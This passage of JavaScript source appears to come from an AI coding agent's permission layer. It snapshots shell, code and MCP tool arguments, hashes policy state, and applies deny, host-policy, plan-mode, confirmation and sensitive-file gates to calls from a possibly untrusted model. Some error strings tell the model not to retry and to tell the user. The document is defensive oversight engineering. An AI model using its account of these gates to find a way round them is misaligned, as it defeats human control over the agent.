              : {}),
            policy: { decision: "allow", rule, via: "ide-diff" },
          },
          verdict.audit,
        ),
      };
    }
    if (verdict?.outcome === "rejected") {
      return {
        outcome: "rejected",
        result: attachDiffReviewAudit(
          {
            error: `[Permission] "${name}" was rejected in the IDE diff review (${source}: ${rule}).`,
            policy: { decision: "deny", rule, via: "ide-diff" },
          },
          verdict.audit,
        ),
      };
    }
    if (verdict?.outcome === "changes-requested") {
      // The reviewer annotated the diff instead of accepting/rejecting: the
      // file is untouched and the notes flow back as the tool result, so the
      // agent revises and re-proposes (Claude-Code inline-review parity).
      const feedback =
        formatReviewComments(verdict.comments, { path: proposal.filePath }) ||
        "The user requested changes in the IDE diff review (no specific notes).";
      return {
        outcome: "changes-requested",
        result: attachDiffReviewAudit(
          {
            error:
              `[IDE review] "${name}" was NOT applied — the user requested changes:\n` +
              `${feedback}\n` +
              "Revise the edit to address this feedback, then propose it again.",
            policy: { decision: "deny", rule, via: "ide-diff-review" },
            reviewComments: verdict.comments,
          },
          verdict.audit,
        ),
      };
    }
  } catch (_err) {
    // diff-approval routing is best-effort — fall back to the normal confirm
  }
  return null;
}

/**
 * Keep the audit available to stream/WS ledger consumers without serializing
 * it into the model-facing tool result (which would waste context tokens).
 */
function attachDiffReviewAudit(result, audit) {
  if (!result || typeof result !== "object" || !audit) return result;
  Object.defineProperty(result, "_diffReviewAudit", {
    value: audit,
    enumerable: false,
    configurable: true,
  });
  return result;
}

const RUN_CODE_ARGUMENT_KEYS = new Set([
  "language",
  "code",
  "timeout",
  "persist",
]);

function snapshotRunCodeExecutionArgs(args) {
  if (
    !args ||
    typeof args !== "object" ||
    Array.isArray(args) ||
    isProxy(args)
  ) {
    throw new TypeError("run_code arguments must be a plain data object");
  }
  const descriptors = Object.getOwnPropertyDescriptors(args);
  for (const key of Reflect.ownKeys(descriptors)) {
    if (typeof key !== "string" || !RUN_CODE_ARGUMENT_KEYS.has(key)) {
      throw new TypeError(`run_code contains unsupported field ${String(key)}`);
    }
    if (!Object.hasOwn(descriptors[key], "value")) {
      throw new TypeError(`run_code field ${key} must be a data property`);
    }
  }
  const language = descriptors.language?.value;
  const code = descriptors.code?.value;
  if (typeof language !== "string" || !language) {
    throw new TypeError("run_code language must be a non-empty string");
  }
  if (typeof code !== "string") {
    throw new TypeError("run_code code must be a string");
  }
  const snapshot = { language, code };
  if (descriptors.timeout) {
    const timeout = descriptors.timeout.value;
    if (typeof timeout !== "number" || !Number.isFinite(timeout)) {
      throw new TypeError("run_code timeout must be a finite number");
    }
    snapshot.timeout = timeout;
  }
  if (descriptors.persist) {
    const persist = descriptors.persist.value;
    if (typeof persist !== "boolean") {
      throw new TypeError("run_code persist must be a boolean");
    }
    snapshot.persist = persist;
  }
  return Object.freeze(snapshot);
}

function runCodeApprovalDescriptor(args, cwd) {
  return Object.freeze({
    language: args.language,
    codeSha256: createHash("sha256").update(args.code, "utf8").digest("hex"),
    codeBytes: Buffer.byteLength(args.code, "utf8"),
    timeout: Math.min(Math.max(args.timeout || 60, 1), 300),
    persist: args.persist === true,
    cwd,
  });
}

function canonicalPolicyAuthorityData(value, state = null, depth = 0) {
  const budget = state || { nodes: 0, seen: new WeakSet() };
  budget.nodes += 1;
  if (budget.nodes > 4096 || depth > 12) {
    throw new TypeError("policy authority exceeds canonical bounds");
  }
  if (value === null) return "null";
  if (value === undefined) return '"$undefined"';
  if (typeof value === "string" || typeof value === "boolean") {
    return JSON.stringify(value);
  }
  if (typeof value === "number") {
    if (!Number.isFinite(value)) {
      throw new TypeError("policy authority contains a non-finite number");
    }
    return JSON.stringify(value);
  }
  if (typeof value !== "object" || isProxy(value)) {
    throw new TypeError("policy authority must contain data objects only");
  }
  if (budget.seen.has(value)) {
    throw new TypeError("policy authority must not contain cycles");
  }
  budget.seen.add(value);
  try {
    const descriptors = Object.getOwnPropertyDescriptors(value);
    const keys = Reflect.ownKeys(descriptors);
    if (keys.some((key) => typeof key !== "string") || keys.length > 512) {
      throw new TypeError("policy authority contains invalid keys");
    }
    if (Array.isArray(value)) {
      const length = descriptors.length?.value;
      if (!Number.isSafeInteger(length) || length < 0 || length > 512) {
        throw new TypeError("policy authority array exceeds bounds");
      }
      const entries = [];
      for (let index = 0; index < length; index += 1) {
        const descriptor = descriptors[String(index)];
        if (!descriptor || !Object.hasOwn(descriptor, "value")) {
          throw new TypeError("policy authority arrays must be dense data");
        }
        entries.push(
          canonicalPolicyAuthorityData(descriptor.value, budget, depth + 1),
        );
      }
      const allowedKeys = new Set([
        "length",
        ...Array.from({ length }, (_, index) => String(index)),
      ]);
      if (keys.some((key) => !allowedKeys.has(key))) {
        throw new TypeError("policy authority arrays contain extra fields");
      }
      return `[${entries.join(",")}]`;
    }
    const prototype = Object.getPrototypeOf(value);
    if (prototype !== Object.prototype && prototype !== null) {
      throw new TypeError("policy authority must contain plain objects");
    }
    return `{${keys
      .sort()
      .map((key) => {
        const descriptor = descriptors[key];
        if (!Object.hasOwn(descriptor, "value")) {
          throw new TypeError("policy authority accessors are not allowed");
        }
        return `${JSON.stringify(key)}:${canonicalPolicyAuthorityData(
          descriptor.value,
          budget,
          depth + 1,
        )}`;
      })
      .join(",")}}`;
  } finally {
    budget.seen.delete(value);
  }
}

function digestPolicyAuthority(projection) {
  return createHash("sha256")
    .update("chainlesschain.shell-policy-authority.v1\0", "utf8")
    .update(canonicalPolicyAuthorityData(projection), "utf8")
    .digest("hex");
}

function validatePermissionRuleset(rules) {
  if (!rules) return null;
  if (typeof rules !== "object" || Array.isArray(rules)) {
    throw new TypeError(
      "permission authority provider returned an invalid ruleset",
    );
  }
  const normalized = {};
  for (const key of ["allow", "ask", "deny"]) {
    const value = rules[key];
    if (value !== undefined && !Array.isArray(value)) {
      throw new TypeError(
        "permission authority provider returned an invalid ruleset",
      );
    }
    normalized[key] = value ? [...value] : [];
  }
  return normalized;
}

function projectPermissionAuthority({ authority, rules, tool, args, cwd }) {
  const verdict = rules
    ? evaluatePermissionRules({ tool, args, cwd, rules })
    : { decision: null, rule: null };
  const source = verdict.rule
    ? authority?.sources?.[`${verdict.decision}:${verdict.rule}`] || null
    : null;
  const scopedRule = source?.startsWith("scoped:")
    ? authority?.scoped?.rules?.find(
        (record) =>
          record.status === "active" && `scoped:${record.id}` === source,
      ) || null
    : null;
  return {
    rules: rules || null,
    sources: authority?.sources || null,
    scoped: authority?.scoped || null,
    version: authority?.version || authority?.policyVersion || null,
    revision: authority?.revision ?? null,
    headHash: authority?.headHash || null,
    verdict: {
      decision: verdict.decision || null,
      rule: verdict.rule || null,
      source,
      scopedRule: scopedRule
        ? {
            id: scopedRule.id || null,
            revision: scopedRule.revision ?? null,
            expiresAt: scopedRule.expiresAt ?? null,
            status: scopedRule.status || null,
          }
        : null,
    },
  };
}

function selectedHostToolPolicy(hostAuthority, tool) {
  const policies = hostAuthority?.tools || hostAuthority?.toolPolicies || null;
  return policies && typeof policies === "object"
    ? policies[tool] || null
    : null;
}

function snapshotPlanToolAuthority(planManager, tool, args) {
  const active = planManager?.isActive?.() === true;
  return {
    active,
    executionLockActive: planManager?.executionLock != null,
    toolAllowed:
      !active || (tool === "git" && isReadOnlyGitCommand(args?.command))
        ? true
        : planManager?.isToolAllowed?.(tool) === true,
  };
}

function snapshotEffectiveToolSetAuthority(effectiveAllowedToolNames, tool) {
  const enforced = Array.isArray(effectiveAllowedToolNames);
  return {
    enforced,
    allowed: !enforced || effectiveAllowedToolNames.includes(tool),
  };
}

function evaluateSelectedToolAdmissionAuthority({
  admission,
  tool,
  runtimeDescriptor,
  localToolDescriptor,
  hostManagedToolPolicy,
}) {
  if (admission?.enforce !== true) {
    return {
      override: {},
      decision: null,
      projection: { enforce: false },
    };
  }
  const override =
    admission.tools && typeof admission.tools === "object"
      ? admission.tools[tool] || {}
      : {};
  const tier =
    override.tier ||
    runtimeDescriptor?.tier ||
    getCodingAgentToolPolicy(tool)?.tier ||
    (localToolDescriptor ? "extension" : "mvp");
  const inputs = {
    capabilityGranted:
      override.capabilityGranted ?? admission.capabilityGranted,
    policyAllowed:
      override.policyAllowed ??
      (hostManagedToolPolicy
        ? (hostManagedToolPolicy?.tools ||
            hostManagedToolPolicy?.toolPolicies ||
            {})[tool]?.allowed !== false
        : admission.policyAllowed),
    permissionGranted:
      override.permissionGranted ?? admission.permissionGranted,
    budgetOk: override.budgetOk ?? admission.budgetOk,
    uiSupported: override.uiSupported ?? admission.uiSupported,
  };
  const decision = admitTool({ tool, tier, ...inputs });
  return {
    override,
    decision,
    projection: {
      enforce: true,
      tier: decision.tier,
      capabilityGranted: inputs.capabilityGranted === true,
      policyAllowed: inputs.policyAllowed === true,
      permissionGranted: inputs.permissionGranted === true,
      budgetOk: inputs.budgetOk === true,
      uiSupported: inputs.uiSupported === true,
      admitted: decision.admitted === true,
      unmet: [...decision.unmet],
    },
  };
}

function snapshotApprovalPolicyAuthority(approvalGate, sessionId) {
  if (!approvalGate) return null;
  const snapshot = approvalGate.getAuthorizationPolicySnapshot?.(sessionId);
  if (snapshot && typeof snapshot.then === "function") {
    throw new TypeError("approval policy snapshot must be synchronous");
  }
  if (snapshot) return snapshot;
  return {
    schema: "chainlesschain.approval-policy-authority/v1",
    kind: "legacy-gate",
    sessionId: sessionId ? String(sessionId) : null,
    policy: approvalGate.getSessionPolicy?.(sessionId) || null,
    hasAuthorizationConsumer:
      approvalGate.hasAuthorizationConsumer?.() === true,
  };
}

/**
 * Execute a single tool call with plan-mode filtering and hook pipeline.
 *
 * @param {string} name - tool name
 * @param {object} args - tool arguments
 * @param {object} [context] - optional context
 * @param {object} [context.hookDb] - DB for hooks
 * @param {CLISkillLoader} [context.skillLoader] - skill loader instance
 * @param {string} [context.cwd] - working directory override
 * @returns {Promise<object>} tool result
 */
export async function executeTool(name, args, context = {}) {
  const liveExecutionContext = context;
  // run_shell can cross several asynchronous permission/hook boundaries before
  // reaching executeToolInner. Capture its declared tuple and working directory
  // before any of them so an in-process caller cannot swap the approved command
  // or reinterpret a relative cwd after process.chdir().
  let shellAuthorityCwd = null;
  let shellAuthorityWorkspaceCwd = null;
  let runCodeAuthorityCwd = null;
  if (name === "run_shell") {
    try {
      const entryProcessCwd = process.cwd();
      const declared = snapshotShellExecutionArgs(args);
      const contextCwd =
        context.cwd === undefined || context.cwd === null
          ? entryProcessCwd
          : context.cwd;
      if (typeof contextCwd !== "string" || !contextCwd) {
        throw new TypeError("run_shell context cwd must be a non-empty string");
      }
      if (
        declared.cwd !== undefined &&
        (typeof declared.cwd !== "string" || !declared.cwd)
      ) {
        throw new TypeError("run_shell cwd must be a non-empty string");
      }
      shellAuthorityWorkspaceCwd = fs.realpathSync.native(
        path.resolve(entryProcessCwd, contextCwd),
      );
      if (!fs.statSync(shellAuthorityWorkspaceCwd).isDirectory()) {
        throw new Error("run_shell context cwd is not a directory");
      }
      const requestedCwd = path.resolve(
        shellAuthorityWorkspaceCwd,
        declared.cwd || ".",
      );
      shellAuthorityCwd = fs.realpathSync.native(requestedCwd);
      if (!fs.statSync(shellAuthorityCwd).isDirectory()) {
        throw new Error("run_shell cwd is not a directory");
      }
      args = snapshotShellExecutionArgs({
        ...declared,
        cwd: shellAuthorityCwd,
      });
    } catch (error) {
      return {
        error: `[Shell Dispatch] ${error?.message || "invalid execution arguments"}`,
        policy: {
          decision: "blocked",
          via: "shell-execution-snapshot",
          code: "CC_SHELL_EXECUTION_SNAPSHOT_INVALID",
        },
      };
    }
  }
  if (name === "run_code") {
    try {
      const entryProcessCwd = process.cwd();
      args = snapshotRunCodeExecutionArgs(args);
      const contextCwd =
        context.cwd === undefined || context.cwd === null
          ? entryProcessCwd
          : context.cwd;
      if (typeof contextCwd !== "string" || !contextCwd) {
        throw new TypeError("run_code context cwd must be a non-empty string");
      }
      runCodeAuthorityCwd = fs.realpathSync.native(
        path.resolve(entryProcessCwd, contextCwd),
      );
      if (!fs.statSync(runCodeAuthorityCwd).isDirectory()) {
        throw new Error("run_code cwd is not a directory");
      }
    } catch (error) {
      return {
        error: `[Run Code Dispatch] ${error?.message || "invalid execution arguments"}`,
        policy: {
          decision: "blocked",
          via: "run-code-execution-snapshot",
          code: "CC_RUN_CODE_EXECUTION_SNAPSHOT_INVALID",
        },
      };
    }
  }
  const hookDb = context.hookDb || null;
  const skillLoader = context.skillLoader || _defaultSkillLoader;
  // Keep the authority-bearing workspace root distinct from the command's
  // requested cwd. A command may run in a nested directory, but Plugin policy
  // discovery and strong-sandbox issuance must remain anchored to the host
  // workspace that admitted the tool call.
  const cwd =
    shellAuthorityWorkspaceCwd ||
    runCodeAuthorityCwd ||
    context.cwd ||
    process.cwd();
  const planManager = context.planManager || getPlanModeManager();
  // The provider receives a filtered schema, but an untrusted/buggy model can
  // still emit an arbitrary tool_call. Reuse the same pure preflight that the
  // outer loop runs before checkpoints or execution events.
  const authorityDenial = preflightToolExecutionAuthority(name, args, {
    ...context,
    cwd,
  });
  if (authorityDenial) return authorityDenial;
  let admittedEffectiveToolSetDigest = null;
  if (name === "run_shell") {
    try {
      admittedEffectiveToolSetDigest = digestPolicyAuthority(
        snapshotEffectiveToolSetAuthority(
          context.effectiveAllowedToolNames,
          name,
        ),
      );
    } catch (error) {
      return {
        error:
          "[Shell Dispatch] The effective tool capability ceiling could not be bound. No command side effect was started.",
        policy: {
          decision: "blocked",
          via: "shell-policy-authority",
          code: error?.code || "CC_SHELL_POLICY_AUTHORITY_UNAVAILABLE",
        },
      };
    }
  }
  const localToolDescriptor =
    context.externalToolDescriptors &&
    typeof context.externalToolDescriptors === "object"
      ? context.externalToolDescriptors[name] || null
      : null;
  const localToolExecutor =
    context.externalToolExecutors &&
    typeof context.externalToolExecutors === "object"
      ? context.externalToolExecutors[name] || null
      : null;
  // Bind MCP arguments to one strict immutable JSON snapshot before any
  // asynchronous permission or Hook boundary. This prevents accessors,
  // functions, or later caller mutation from changing the request that was
  // approved, recorded in the ledger, and sent over the wire.
  if (localToolExecutor?.kind === "mcp") {
    try {
      args = snapshotMcpJsonRpcInput(args || {});
    } catch (error) {
      return {
        error:
          "MCP tool blocked because its input is not strict immutable JSON data",
        policy: {
          decision: "blocked",
          via: "mcp-wire-input",
          code: safeMcpErrorCode(error, "CC_MCP_WIRE_INPUT_INVALID"),
        },
      };
    }
  }
  const runtimeDescriptor =
    getRuntimeToolDescriptor(name) || localToolDescriptor;
  let admittedToolAdmissionDigest = null;
  let toolAdmissionEvaluation;
  try {
    toolAdmissionEvaluation = evaluateSelectedToolAdmissionAuthority({
      admission: context.toolAdmission,
      tool: name,
      runtimeDescriptor,
      localToolDescriptor,
      hostManagedToolPolicy: context.hostManagedToolPolicy,
    });
    if (name === "run_shell") {
      admittedToolAdmissionDigest = digestPolicyAuthority(
        toolAdmissionEvaluation.projection,
      );
    }
  } catch (error) {
    return {
      error:
        "[Tool Admission] The selected tool authority could not be bound. No tool side effect was started.",
      policy: {
        decision: "blocked",
        via: "tool-admission",
        code: error?.code || "CC_TOOL_ADMISSION_AUTHORITY_UNAVAILABLE",
      },
    };
  }
  if (toolAdmissionEvaluation.decision) {
    const { override, decision } = toolAdmissionEvaluation;
    const attribution = buildToolAttribution({
      tool: name,
      source:
        override.source ||
        runtimeDescriptor?.source ||
        localToolDescriptor?.source ||
        context.toolAdmission?.source ||
        null,
      version: override.version || runtimeDescriptor?.version || null,
      scope: override.scope || localToolDescriptor?.scope || null,
      callId: context.toolCallId || null,
      decision,
    });
    if (!decision.admitted) {
      return {
        error: `[Tool Admission] Tool "${name}" was not admitted: ${decision.unmet.join(", ")}.`,
        toolAttribution: attribution,
        policy: { decision: "blocked", via: "tool-admission" },
      };
    }
    context = { ...context, toolAttribution: attribution };
  }

  // Built-in file tools are confined to the declared workspace roots even
  // when no process sandbox is enabled. Resolve existing targets (and the
  // nearest existing parent for creates) through symlinks/junctions before any
  // permission hook, IDE preview, credential check, or filesystem operation
  // can touch them. Explicit --add-dir roots and sandbox allowRead/allowWrite
  // paths are the only supported expansions beyond cwd; deny paths still win.
  const workspacePathDenial = guardAgentFileToolPaths(name, args, context, cwd);
  if (workspacePathDenial) return workspacePathDenial;

  // A malformed settings source may have hidden a deny/ask hook. Runtime
  // loaders attach these parse failures as host-owned metadata; executing with
  // a partial authority set would be strictly wider than the configured path.
  const hookAuthorityErrors = context.settingsHooks?._authorityErrors;
  if (Array.isArray(hookAuthorityErrors) && hookAuthorityErrors.length > 0) {
    return {
      error:
        "[Hook Authority] Tool execution blocked because one or more hook policy sources could not be parsed.",
      policy: { decision: "blocked", via: "hook-authority-load" },
      incidents: hookAuthorityErrors.map((entry) => ({
        sourceFile: entry?.sourceFile || entry?.file || null,
        code: entry?.code || "CC_HOOK_AUTHORITY_INVALID",
      })),
    };
  }

  const toolContext = createToolContext({
    toolName: runtimeDescriptor?.name || name,
    cwd,
    metadata: { descriptor: runtimeDescriptor },
  });
  const observeHookIncidents = [];
  const recordObserveHookIncident = (event, source, error) => {
    const incident = Object.freeze({
      code: "CC_HOOK_OBSERVER_DEGRADED",
      event,
      source,
      degraded: true,
      reason: String(error?.message || error || "hook observer failed")
        .replace(/\s+/g, " ")
        .slice(0, 240),
    });
    observeHookIncidents.push(incident);
    try {
      emitHooksV2Event("HookFailure", {
        schema_version: 1,
        session_id: context.sessionId || null,
        turn_id: context.turnId || null,
        tool_use_id: context.toolCallId || null,
        tool_name: name,
        raw_tool_name: name,
        tool_input: args,
        hook_event_name: event,
        hook_source: source,
        incident_code: incident.code,
      });
    } catch {
      // Incident delivery must never turn an observe-only failure into a new
      // authority decision or hide the original tool outcome.
    }
    try {
      context.onHookIncident?.(incident);
    } catch {
      // Optional observer only.
    }
  };

  // Persona toolsDisabled guard
  const persona =
    context.hermeticExecution === true ? null : _loadProjectPersona(cwd);
  if (persona?.toolsDisabled?.includes(name)) {
    return {
      error: `Tool "${name}" is disabled by project persona configuration.`,
    };
  }

  // ── Permission resolution (most-restrictive-wins; denies before prompts) ──
  // Two policy sources gate a tool call: the user's .claude/settings.json rules
  // (deny/ask/allow) and the desktop host's synced policy (hostManagedToolPolicy,
  // usually null in CLI). Precedence, evaluated in this exact order:
  //   1. settings `deny`  → block.
  //   2. host  `deny`     → block. A settings `allow` NEVER relaxes a host deny
  //                         (the desktop runtime authority outranks project
  //                         config); symmetrically a settings `deny` (step 1)
  //                         outranks a host `allow`. Net effect: any deny wins.
  //   3. settings `ask`   → confirm (headless w/o confirmer falls closed).
  //                         Reached only after BOTH denies clear, so a denied
  //                         tool never wastes a confirmation round-trip.
  //   4. settings `allow` → pre-authorize interactive gates OUTSIDE the
  //                         plan-mode hard ceiling. It can never add a tool to
  //                         the planning/approved capability set. The hard
  //                         shell-policy denylist also still applies.
  // No matching rule + no host policy → every existing layer runs unchanged
  // (default behaviour is byte-for-byte).
  let permissionAuthority = null;
  let effectivePermissionRules = context.permissionRules || null;
  if (typeof context.permissionRulesProvider === "function") {
    try {
      permissionAuthority = await context.permissionRulesProvider({
        cwd,
        tool: name,
        args,
      });
      effectivePermissionRules =
        permissionAuthority?.rules || permissionAuthority || null;
      if (
        effectivePermissionRules &&
        (!Array.isArray(effectivePermissionRules.allow) ||
          !Array.isArray(effectivePermissionRules.ask) ||
          !Array.isArray(effectivePermissionRules.deny))
      ) {
        throw new TypeError(
          "permission authority provider returned an invalid ruleset",
        );
      }
    } catch (error) {
      return {
        error:
          `[Permission Authority] Tool "${name}" was blocked because the current permission authority could not be resolved. ` +
          "No tool side effect was started.",
        policy: {
          decision: "blocked",
          via: "permission-authority-load",
          code: error?.code || "CC_PERMISSION_AUTHORITY_UNAVAILABLE",
        },
      };
    }
  }
  const evaluatedSettingsVerdict = effectivePermissionRules
    ? evaluatePermissionRules({
        tool: name,
        args,
        cwd,
        rules: effectivePermissionRules,
      })
    : { decision: null, rule: null };
  const permissionRuleSource = evaluatedSettingsVerdict.rule
    ? permissionAuthority?.sources?.[
        `${evaluatedSettingsVerdict.decision}:${evaluatedSettingsVerdict.rule}`
      ] || null
    : null;
  const matchedScopedRule = permissionRuleSource?.startsWith("scoped:")
    ? permissionAuthority?.scoped?.rules?.find(
        (record) =>
          record.status === "active" &&
          `scoped:${record.id}` === permissionRuleSource,
      )
    : null;
  const settingsVerdict = {
    ...evaluatedSettingsVerdict,
    source: permissionRuleSource,
    priority:
      evaluatedSettingsVerdict.decision === "deny"
        ? 1
        : evaluatedSettingsVerdict.decision === "ask"
          ? 3
          : evaluatedSettingsVerdict.decision === "allow"
            ? 4
            : null,
    scopedRule: matchedScopedRule || null,
  };
  let admittedPermissionPolicyDigest = null;
  if (name === "run_shell") {
    try {
      admittedPermissionPolicyDigest = digestPolicyAuthority(
        projectPermissionAuthority({
          authority: permissionAuthority,
          rules: validatePermissionRuleset(effectivePermissionRules),
          tool: name,
          args,
          cwd,
        }),
      );
    } catch (error) {
      return {
        error:
          "[Shell Dispatch] The evaluated permission authority could not be bound. No command side effect was started.",
        policy: {
          decision: "blocked",
          via: "shell-policy-authority",
          code: error?.code || "CC_SHELL_POLICY_AUTHORITY_UNAVAILABLE",
        },
      };
    }
  }

  // 1. settings deny
  if (settingsVerdict.decision === "deny") {
    return {
      error: `[Permission] Tool "${name}" denied by settings rule: ${settingsVerdict.rule}. This is a configured policy — retrying won't help; tell the user if the task genuinely needs it.`,
      policy: {
        decision: "deny",
        rule: settingsVerdict.rule,
        via: "settings",
        source: settingsVerdict.source,
        priority: settingsVerdict.priority,
        scopedRuleId: settingsVerdict.scopedRule?.id || null,
        revision: settingsVerdict.scopedRule?.revision || null,
        expiresAt: settingsVerdict.scopedRule?.expiresAt || null,
      },
    };
  }

  // Resolve the host policy (needed for the host-deny check + the plan-mode
  // block below). Computed once here so a host deny can short-circuit before
  // any settings `ask` prompt.
  const toolPolicies =
    context.hostManagedToolPolicy?.tools ||
    context.hostManagedToolPolicy?.toolPolicies ||
    null;
  const hostToolPolicy =
    toolPolicies && typeof toolPolicies === "object"
      ? toolPolicies[name]
      : null;
  let admittedHostPolicyDigest = null;
  if (name === "run_shell") {
    try {
      admittedHostPolicyDigest = digestPolicyAuthority(hostToolPolicy);
    } catch (error) {
      return {
        error:
          "[Shell Dispatch] The evaluated host policy could not be bound. No command side effect was started.",
        policy: {
          decision: "blocked",
          via: "shell-policy-authority",
          code: error?.code || "CC_SHELL_POLICY_AUTHORITY_UNAVAILABLE",
        },
      };
    }
  }
  const hostPolicyAllowsReadOnlyGit =
    name === "git" &&
    hostToolPolicy?.planModeBehavior === "readonly-conditional" &&
    isReadOnlyGitCommand(args.command);

  // 2. host deny (a settings `allow` does not relax this)
  if (
    hostToolPolicy &&
    hostToolPolicy.allowed === false &&
    !hostPolicyAllowsReadOnlyGit
  ) {
    return {
      error: `[Host Policy] Tool "${name}" is blocked by desktop host policy. ${hostToolPolicy.reason || "Desktop approval has not been synchronized yet."}`,
      policy: {
        decision: hostToolPolicy.decision || "blocked",
        requiresPlanApproval: hostToolPolicy.requiresPlanApproval === true,
        requiresConfirmation: hostToolPolicy.requiresConfirmation === true,
        riskLevel: hostToolPolicy.riskLevel || null,
      },
    };
  }

  // Plan mode is a capability ceiling, not another prompt/approval source.
  // Evaluate it before settings `ask`, sensitive-file confirmation, and every
  // other interactive gate so no `allow` or confirmed `ask` can widen the
  // planning tool set. Read-only git remains a built-in conditional capability.
  // External tools remain blocked until a host-owned, per-tool effect authority
  // exists; server annotations/descriptors cannot self-authorize Plan access.
  const executionLockActive = planManager.executionLock != null;
  const planReadOnlyFenceActive =
    planManager.isActive() && !executionLockActive;
  const externalToolBlockedDuringPlanning =
    planReadOnlyFenceActive && !STATIC_AGENT_TOOL_NAMES.has(name);
  let admittedPlanPolicyDigest = null;
  if (name === "run_shell") {
    try {
      admittedPlanPolicyDigest = digestPolicyAuthority(
        snapshotPlanToolAuthority(planManager, name, args),
      );
    } catch (error) {
      return {
        error:
          "[Shell Dispatch] The evaluated plan authority could not be bound. No command side effect was started.",
        policy: {
          decision: "blocked",
          via: "shell-policy-authority",
          code: error?.code || "CC_SHELL_POLICY_AUTHORITY_UNAVAILABLE",
        },
      };
    }
  }
  context = { ...context, planReadOnlyFenceActive };
  if (
    planManager.isActive() &&
    !(name === "git" && isReadOnlyGitCommand(args.command)) &&
    (externalToolBlockedDuringPlanning || !planManager.isToolAllowed(name))
  ) {
    if (!executionLockActive) {
      planManager.addPlanItem({
        title: `${name}: ${formatToolArgs(name, args)}`,
        tool: name,
        params: args,
        estimatedImpact:
          name === "run_shell" ||
          name === "run_code" ||
          name === "git" ||
          localToolDescriptor?.riskLevel === "high"
            ? "high"
            : GUARDED_FILE_MUTATION_TOOLS.has(name) ||
                localToolDescriptor?.riskLevel === "medium"
              ? "medium"
              : "low",
      });
    }
    return {
      error: executionLockActive
        ? `[Plan Execution Lock] Tool "${name}" was not in the approved tool set. Request a plan revision before using it.`
        : `[Plan Mode] Tool "${name}" is blocked during planning. It has been added to the plan. Use /plan approve to execute.`,
      policy: {
        decision: "blocked",
        via: executionLockActive ? "plan-execution-lock" : "plan-mode",
      },
    };
  }

  // 3 + 4. settings ask / allow (only reached when neither layer denied)
  let ruleAllowed = false;
  if (settingsVerdict.decision === "ask") {
    // IDE-native diff approval (Claude-Code parity): for file edits in an
    // interactive session with an IDE bridge connected, review the edit in
    // the editor instead of a terminal y/N. Accepted = the IDE wrote the
    // file → return the synthetic result and SKIP execution; rejected =
    // deny; null = fall through to the normal confirm below. Shared with the
    // PreToolUse-hook ask path (tryIdeDiffApprovalForEdit).
    const ide = await tryIdeDiffApprovalForEdit(name, args, context, cwd, {
      rule: settingsVerdict.rule,
      source: "settings rule",
    });
    if (ide) return ide.result;
    const ok = await requestInteractivePermission(name, args, context, cwd, {
      tool: name,
      args,
      rule: settingsVerdict.rule,
      reason: `settings rule ${settingsVerdict.rule} requires confirmation`,
    });
    if (!ok) {
      return {
        error: `[Permission] Tool "${name}" requires confirmation (settings rule: ${settingsVerdict.rule}) but this run is non-interactive — denied. Do not retry; tell the user this action needs their approval.`,
        policy: {
          decision: "ask",
          rule: settingsVerdict.rule,
          via: "settings",
          source: settingsVerdict.source,
          priority: settingsVerdict.priority,
          scopedRuleId: settingsVerdict.scopedRule?.id || null,
          revision: settingsVerdict.scopedRule?.revision || null,
          expiresAt: settingsVerdict.scopedRule?.expiresAt || null,
        },
      };
    }
    ruleAllowed = true; // confirmed → treat like allow downstream
  } else if (settingsVerdict.decision === "allow") {
    ruleAllowed = true;
  }

  // MCP annotations are peer-provided hints, never execution authority. A
  // server that claims readOnlyHint=true therefore still needs a request-level
  // approval unless the host independently authorized this exact tool as a
  // trusted read. An explicit settings allow can suppress the default prompt,
  // but it cannot suppress a host-owned `ask`/requiresConfirmation decision.
  // Plan mode has already applied its stricter hard ceiling above, so this gate
  // covers normal interactive/Auto execution without creating a Plan escape.
  if (localToolExecutor?.kind === "mcp") {
    const mcpEffectContract = mcpLedgerEffectContract(
      localToolDescriptor,
      hostToolPolicy,
    );
    const trustedHostRead =
      mcpEffectContract.effect === McpEffect.READ &&
      mcpEffectContract.trusted === true;
    const settingsAskWasConfirmed =
      settingsVerdict.decision === "ask" && ruleAllowed;
    const hostRequiresConfirmation =
      !settingsAskWasConfirmed &&
      (hostToolPolicy?.requiresConfirmation === true ||
        hostToolPolicy?.decision === "ask");
    const defaultRequiresConfirmation = !trustedHostRead && !ruleAllowed;

    if (hostRequiresConfirmation || defaultRequiresConfirmation) {
      const approved = await requestInteractivePermission(
        name,
        args,
        context,
        cwd,
        {
          tool: name,
          args,
          rule: null,
          reason: hostRequiresConfirmation
            ? "host policy requires confirmation for this MCP tool"
            : `MCP effect is ${mcpEffectContract.effect} and lacks a trusted host read authorization`,
          source: hostRequiresConfirmation
            ? "host-managed MCP policy"
            : "MCP effect contract",
          mcpEffect: mcpEffectContract.effect,
          mcpTrusted: mcpEffectContract.trusted === true,
        },
      );
      if (!approved) {
        return {
          error: `[MCP Permission] Tool "${name}" requires confirmation because its effect is ${mcpEffectContract.effect} and it does not have an applicable trusted host read authorization — denied.`,
          policy: {
            decision: "ask",
            via: hostRequiresConfirmation
              ? "host-mcp-policy"
              : "mcp-effect-contract",
            code: "CC_MCP_EFFECT_CONFIRMATION_REQUIRED",
            effect: mcpEffectContract.effect,
            trusted: mcpEffectContract.trusted === true,
          },
        };
      }
      // The approval is scoped to this request and also satisfies the later
      // generic external-tool/ApprovalGate prompt for the same invocation.
      ruleAllowed = true;
    }
  }

  // Sensitive-file write guard (Claude-Code 2.1.160 parity): shell startup
  // files / PowerShell profiles / git+husky hooks execute code on the user's
  // next shell or commit — even otherwise-permitted edit flows confirm first.
  // Auto-exec configs (.vscode/tasks.json, .mcp.json, .idea run configs, …)
  // ride the same gate via autoExecConfigReason.
  // An explicit settings `allow` rule is the only bypass (exact user
  // pre-authorization); headless without a confirmer fails closed.
  if (
    GUARDED_FILE_MUTATION_TOOLS.has(name) &&
    settingsVerdict.decision !== "allow"
  ) {
    const { sensitiveFileReason, autoExecConfigReason } =
      await import("../lib/sensitive-file-guard.js");
    const guarded = fileMutationPaths(name, args)
      .map((candidatePath) => ({
        path: candidatePath,
        reason:
          sensitiveFileReason(candidatePath) ||
          autoExecConfigReason(candidatePath),
      }))
      .find((candidate) => candidate.reason);
    if (guarded) {
      const ok = await requestInteractivePermission(name, args, context, cwd, {
        tool: name,
        args,
        rule: null,
        reason: `sensitive file: ${guarded.reason}`,
      });
      if (!ok) {
        return {
          error: `[Sensitive File] Mutating "${guarded.path}" requires confirmation (${guarded.reason}) — denied. Add a settings allow rule to pre-authorize.`,
          policy: { decision: "ask", via: "sensitive-file" },
        };
      }
    }
  }

  // Session-store write guard (transcript tamper protection): JSONL
